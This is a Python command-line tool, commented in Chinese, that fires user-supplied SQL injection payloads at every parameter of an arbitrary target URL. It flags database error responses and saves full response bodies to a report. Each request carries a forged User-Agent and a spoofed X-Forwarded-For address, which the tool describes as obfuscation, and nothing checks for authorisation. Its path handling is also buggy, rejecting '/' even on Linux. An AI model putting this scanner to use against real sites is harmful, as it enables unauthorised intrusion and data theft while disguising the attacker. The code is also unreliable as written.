import os
import platform
import sys
import re
import time
import requests
import random
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse

# 伪造 User-Agent 池（模拟不同浏览器）
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.3 Safari/605.1.15",
    "Mozilla/5.0 (Linux; Android 13; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.3 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0"
]

# 伪造 IP 池（覆盖国内外常见网段）
FAKE_IPS = [
    "192.168.1.%d" % random.randint(2, 254),   # 内网 IP
    "10.0.0.%d" % random.randint(2, 254),       # 内网 IP
    "202.102.192.%d" % random.randint(2, 254),  # 国内公网 IP（示例）
    "104.244.72.%d" % random.randint(2, 254),   # 国外公网 IP（示例）
    "172.16.31.%d" % random.randint(2, 254)     # 内网 IP
]


def normalize_path(user_path):
    """规范文件路径，适配不同系统"""
    if platform.system() == "Windows":
        user_path = user_path.replace('/', '\\')  
    else:
        user_path = user_path.replace('\\', '/')  

    invalid_chars = ['<', '>', '"', '/', '|', '?', '*']
    for char in invalid_chars:
        if char in user_path:
            sys_type = "Windows" if platform.system() == "Windows" else "Linux"
            print(f"❌ {sys_type} 系统路径包含非法字符「{char}」！"
                  f"合法字符：字母、数字、下划线、{os.sep}、- 等")
            sys.exit(1)
    print(f"Windows: D:\DDOS\SQL注入数据库\SQL高级攻击.sql（可放任意文件）")
    print(f"Linux: /root/DDOS/SQL注入数据库/SQL高级攻击.sql（可放任意文件）")     
    return user_path


def load_custom_payload():
    """手动输入 Payload 文件路径，加载注入语句（完全自定义路径）"""
    while True:
        payload_file = input("请输入 Payload 文件的完整路径（支持相对路径/绝对路径，如：payloads.txt 或 D:/test/payloads.txt）：")
        normalized_path = normalize_path(payload_file)  

        if not os.path.exists(normalized_path):
            print(f"❌ 错误：文件「{normalized_path}」不存在，请重新输入！")
            continue
        if not os.access(normalized_path, os.R_OK):
            print(f"❌ 错误：文件「{normalized_path}」无读取权限，请重新输入！")
            continue

        with open(normalized_path, "r", encoding="utf-8") as f:
            payloads = [line.strip() for line in f if line.strip()]

        if payloads:
            print(f"✅ 成功加载 {len(payloads)} 条 Payload | 加载文件：{normalized_path}")
            return payloads
        else:
            print(f"❌ 警告：文件「{normalized_path}」中无有效 Payload（空文件或全为空行），请重新输入！")


def parse_url_params(target_url):
    """解析 URL 中的参数"""
    parsed = urlparse(target_url)
    query_params = parse_qs(parsed.query)
    return parsed, query_params


def build_test_url(parsed_url, query_params, param_key, payload):
    """构造带注入 Payload 的测试 URL"""
    temp_params = query_params.copy()  
    temp_params[param_key] = [payload]
    new_query = urlencode(temp_params, doseq=True)
    return urlunparse(parsed_url._replace(query=new_query))


def detect_sql_injection(response):
    """检测响应中是否存在 SQL 注入特征"""
    error_keywords = [
        "SQL syntax error", "syntax error", "error in your SQL syntax",
        "MySQL Error", "PostgreSQL Error", "Oracle Error", 
        "Microsoft SQL Server Error", "database", "query error", "sqlite"
    ]
    return response.status_code >= 400 or any(kw in response.text for kw in error_keywords)


def fake_headers():
    """生成随机伪造的请求头（User-Agent + 虚假 IP）"""
    return {
        "User-Agent": random.choice(USER_AGENTS),
        "X-Forwarded-For": random.choice(FAKE_IPS)
    }


def run_sql_injection_test(target_url, payloads):
    """执行 SQL 注入测试主逻辑，【核心修改：记录完整响应体】"""
    results = []
    parsed_url, query_params = parse_url_params(target_url)

    for param_key in query_params.keys():
        results.append(f"\n🔍 开始测试参数：{param_key}")
        for payload in payloads:
            test_url = build_test_url(parsed_url, query_params, param_key, payload)
            results.append(f"  → 测试 URL：{test_url}")

            try:
                start_time = time.time()
                response = requests.get(
                    test_url, 
                    timeout=10, 
                    allow_redirects=False, 
                    headers=fake_headers()  
                )
                elapsed_time = time.time() - start_time

                # 【核心修改】删除响应体截取逻辑，保留完整内容
                results.append(f"    ↳ 响应状态码：{response.status_code}")
                results.append(f"    ↳ 响应头：{dict(response.headers)}")
                results.append(f"    ↳ 响应体（完整内容）：{response.text}")  # 原代码为 response.text[:500]

                response.raise_for_status()

                if detect_sql_injection(response):
                    results.append(
                        f"    ‼️ 疑似 SQL 注入漏洞（参数：{param_key}，Payload：{payload}，耗时：{elapsed_time:.2f}s）"
                    )
                else:
                    results.append(
                        f"    ✔️ 无明显漏洞（参数：{param_key}，Payload：{payload}，耗时：{elapsed_time:.2f}s）"
                    )

            except requests.Timeout:
                results.append(f"    ❌ 请求超时（超过 10 秒）：{test_url}")
            except requests.exceptions.ConnectionError as e:
                results.append(f"    ❌ 网络连接异常（服务端无响应或网络中断）：{test_url} | 详情：{str(e)}")
            except requests.RequestException as e:
                results.append(f"    ❌ 请求失败：{str(e)} | 测试 URL：{test_url}")
            except Exception as e:
                results.append(f"    ❌ 未知错误：{str(e)} | 测试 URL：{test_url}")

    return results


def output_results(test_results, report_path):
    """结果输出：命令行显示 + 自定义路径写入文件（完整响应体同步保存）"""
    print("\n==== 测试结果汇总 ====")
    for line in test_results:
        print(line)
    print("======================\n")

    try:
        report_path = normalize_path(report_path)
        full_report_path = os.path.join(report_path, "sql_injection_test_report.txt")
        
        with open(full_report_path, "w", encoding="utf-8") as f:
            f.write("\n".join(test_results))
        print(f"✅ 结果已保存至：{os.path.abspath(full_report_path)}")
    except Exception as e:
        print(f"❌ 保存报告失败：{str(e)}，结果仅输出到命令行")


def main():
    """程序主入口：引导用户输入 + 执行流程"""
    print("=" * 60)
    print("📌 SQL 注入测试工具（支持虚假 IP/UA 伪造，【完整响应体显示】，自定义报告路径）")
    print("=" * 60)

    payloads = load_custom_payload()

    target_url = input("请输入目标测试 URL（例如：https://example.com/?id=1&name=test）：")
    if not re.match(r'https?://\S+', target_url):
        print("❌ 错误：URL 格式无效，必须包含 http:// 或 https://")
        sys.exit(1)

    report_path = input("请输入报告生成路径（如 D:\\DDOS\\测试数据 ，路径需已存在）：")
    if not os.path.exists(report_path):
        print(f"❌ 错误：路径「{report_path}」不存在，请确认后重新运行程序！")
        sys.exit(1)

    print("\n🚀 开始执行 SQL 注入测试（已启用虚假 IP/UA 混淆，【显示完整响应体】）...")
    test_results = run_sql_injection_test(target_url, payloads)

    output_results(test_results, report_path)

    print("\n🔚 测试流程结束！")


if __name__ == "__main__":
    main()